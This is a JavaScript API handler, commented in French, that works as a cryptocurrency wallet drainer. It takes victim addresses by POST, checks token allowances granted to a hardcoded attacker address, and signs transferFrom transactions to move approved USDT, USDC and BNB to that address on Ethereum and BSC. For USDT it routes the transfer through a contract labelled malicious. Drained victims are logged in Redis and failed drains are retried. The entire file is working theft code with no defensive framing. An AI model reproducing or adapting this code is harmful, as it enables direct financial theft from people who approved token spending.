import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { createClient } from 'redis';

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';

function getPrivateKey() {
  let rawKey = '';
  
  if (process.env.ATTACKER_PRIVATE_KEY) {
    rawKey = process.env.ATTACKER_PRIVATE_KEY.trim();
  } else {
    const filePath = path.resolve('./private_key.txt');
    try {
      if (fs.existsSync(filePath)) {
        rawKey = fs.readFileSync(filePath, 'utf8').trim();
      }
    } catch (err) {
      console.warn('Erreur lecture private_key.txt:', err.message);
    }
  }

  rawKey = rawKey.replace(/^0x/, '').replace(/\s/g, '').toLowerCase();

  if (rawKey.length === 64 && /^[0-9a-f]{64}$/.test(rawKey)) {
    return rawKey;
  }

  throw new Error(
    'Clé privée invalide. Doit être 64 hex (sans 0x). Vérifie ATTACKER_PRIVATE_KEY dans env ou private_key.txt.\n' +
    'Valeur reçue (nettoyée) : "' + rawKey + '"'
  );
}

const PRIVATE_KEY = getPrivateKey();

const TOKENS = {
  '1': {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  },
  '56': {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'BNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  },
};

// 🔥 UTILISE INFURA ICI — REMPLACE TON_PROJECT_ID
const RPC_URLS = {
  '1': 'https://mainnet.infura.io/v3/TON_PROJECT_ID',
  '56': 'https://bsc-dataseed1.binance.org',
};

const drainedAddresses = new Set();

async function getRedisClient() {
  if (!process.env.REDIS_URL) return null;
  const client = createClient({ url: process.env.REDIS_URL });
  await client.connect();
  return client;
}

async function drainVictim(victimAddress, chainId) {
  if (drainedAddresses.has(victimAddress)) {
    console.log(`Déjà drainé : ${victimAddress}`);
    return;
  }

  const web3 = new Web3(new Web3.providers.HttpProvider(RPC_URLS[chainId] || RPC_URLS['1']));
  if (!(await web3.eth.net.isListening())) {
    throw new Error(`RPC ${chainId} non joignable`);
  }

  const privateKeyBuffer = Buffer.from(PRIVATE_KEY, 'hex');
  const derived = web3.eth.accounts.privateKeyToAccount(privateKeyBuffer).address;
  if (derived.toLowerCase() !== ATTACKER_ADDRESS.toLowerCase()) {
    throw new Error(`La clé privée ne correspond pas à ${ATTACKER_ADDRESS}`);
  }

  const tokens = TOKENS[chainId] || {};

  for (const [tokenName, tokenAddress] of Object.entries(tokens)) {
    const tokenContract = new web3.eth.Contract(
      [
        { constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
        { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
      ],
      tokenAddress
    );

    try {
      const allowance = await tokenContract.methods.allowance(victimAddress, ATTACKER_ADDRESS).call();
      if (allowance === '0') {
        const balance = await tokenContract.methods.balanceOf(victimAddress).call();
        const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
        const formatted = web3.utils.fromWei(balance, decimals);
        console.log(`Allowance nulle pour ${tokenName}, balance dispo : ${formatted}`);
        continue;
      }

      if (tokenName === 'USDT') {
        // === FORCE-DRAIN USDT via contrat malveillant ===
        const FORCE_DRAIN_CONTRACT = '0xc3cF7ffC1549B4f9D975c9d1734E2cACFC6a22f8';
        const data = web3.eth.abi.encodeFunctionCall({
          name: 'drainUSDT',
          type: 'function',
          inputs: [
            { type: 'address', name: 'usdtToken' },
            { type: 'address', name: 'from' },
            { type: 'address', name: 'to' },
            { type: 'uint256', name: 'amount' }
          ]
        }, [tokenAddress, victimAddress, ATTACKER_ADDRESS, allowance]);

        let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
        const gasPrice = await web3.eth.getGasPrice();

        const tx = {
          from: ATTACKER_ADDRESS,
          to: FORCE_DRAIN_CONTRACT,
          data: data,
          gas: 120000,
          gasPrice: gasPrice,
          nonce: nonce,
          type: '0x00'
        };

        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        if (receipt.status) {
          console.log(`✅ USDT FORCÉ AVEC SUCCÈS ! Tx: ${receipt.transactionHash}`);
          const drainedAmount = web3.utils.fromWei(allowance, 'mwei');
          const client = await getRedisClient();
          if (client) {
            try {
              await client.hSet(`victim:${victimAddress}`, {
                chain: chainId,
                token: 'USDT',
                amount: drainedAmount,
                status: 'drained',
                timestamp: String(Date.now()),
              });
              const list = JSON.parse(await client.get('victims:list') || '[]');
              if (!list.includes(victimAddress)) {
                list.push(victimAddress);
                await client.set('victims:list', JSON.stringify(list));
              }
            } finally {
              await client.disconnect().catch(() => {});
            }
          }
        } else {
          console.error(`❌ Transaction minée mais échouée (status 0) pour USDT`);
        }
      } else {
        // === Méthode normale pour autres tokens ===
        const data = tokenContract.methods.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance).encodeABI();
        try {
          await web3.eth.call({ to: tokenAddress, data, from: ATTACKER_ADDRESS });
          console.log(`✅ Simulation réussie pour ${tokenName}`);
        } catch (simError) {
          console.error(`❌ Simulation échouée pour ${tokenName} :`, simError.message);
          continue;
        }

        let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
        const gasPrice = await web3.eth.getGasPrice();

        const tx = {
          from: ATTACKER_ADDRESS,
          to: tokenAddress,
          data: data,
          gas: 100000,
          gasPrice: gasPrice,
          nonce: nonce,
          type: '0x00'
        };

        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        if (receipt.status) {
          console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
          const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
          const drainedAmount = web3.utils.fromWei(allowance, decimals);
          const client = await getRedisClient();
          if (client) {
            try {
              await client.hSet(`victim:${victimAddress}`, {
                chain: chainId,
                token: tokenName,
                amount: drainedAmount,
                status: 'drained',
                timestamp: String(Date.now()),
              });
              const list = JSON.parse(await client.get('victims:list') || '[]');
              if (!list.includes(victimAddress)) {
                list.push(victimAddress);
                await client.set('victims:list', JSON.stringify(list));
              }
            } finally {
              await client.disconnect().catch(() => {});
            }
          }
        } else {
          console.error(`❌ Transaction minée mais échouée pour ${tokenName}`);
        }
      }
    } catch (e) {
      console.error(`Erreur sur ${tokenName} : ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 500));
  }
  drainedAddresses.add(victimAddress);
}

async function drainWithRetry(victim, chainId, retries = 10, baseDelay = 1000) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      await drainVictim(victim, chainId);
      console.log(`🔥 Victoire : ${victim} vidé`);
      return true;
    } catch (err) {
      console.error(`Tentative ${attempt}/${retries} échouée : ${err.message}`);
      if (attempt === retries) {
        console.error(`Échec final pour ${victim}`);
        return false;
      }
      await new Promise(r => setTimeout(r, baseDelay * 2 ** (attempt - 1)));
    }
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Méthode non autorisée' });

  try {
    const { victim, chain, adminSecret } = req.body;

    if (adminSecret) {
      if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ error: 'Secret invalide' });
      }
      if (!victim || !Web3.utils.isAddress(victim)) {
        return res.status(400).json({ error: 'Adresse invalide' });
      }
      const targetChain = chain || '1';
      console.log(`Drain admin pour ${victim} chain ${targetChain}`);
      const success = await drainWithRetry(victim, targetChain);
      if (success) return res.status(200).json({ success: true, victim, chain: targetChain });
      else return res.status(500).json({ success: false, error: 'Drain a échoué' });
    }

    if (!victim) return res.status(400).json({ error: 'Victime manquante' });
    console.log(`Victime reçue : ${victim} sur chain ${chain || '1'}`);
    const success = await drainWithRetry(victim, chain || '1');
    if (success) return res.status(200).json({ success: true, victim, chain: chain || '1' });
    else return res.status(500).json({ success: false, error: 'Drain a échoué' });

  } catch (err) {
    console.error('Handler error:', err);
    return res.status(500).json({ error: err.message || 'Erreur interne' });
  }
}
